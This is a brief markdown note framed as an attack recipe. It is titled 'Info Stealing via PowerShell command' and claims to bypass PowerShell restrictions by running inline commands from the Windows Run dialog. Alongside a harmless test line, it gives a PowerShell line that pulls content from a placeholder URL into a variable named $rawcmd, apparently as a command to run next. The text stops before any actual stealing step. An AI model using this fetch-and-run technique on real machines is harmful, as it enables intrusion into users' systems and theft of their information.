# Info Stealing via PowerShell command

## ByPass PowerShell restriction

Using "run" application to run powershell command inline:

    - powershell Write-Host "Test"; Start-Sleep -Seconds 1
    - powershell $rawcmd = Invoke-webrequest -URI https://...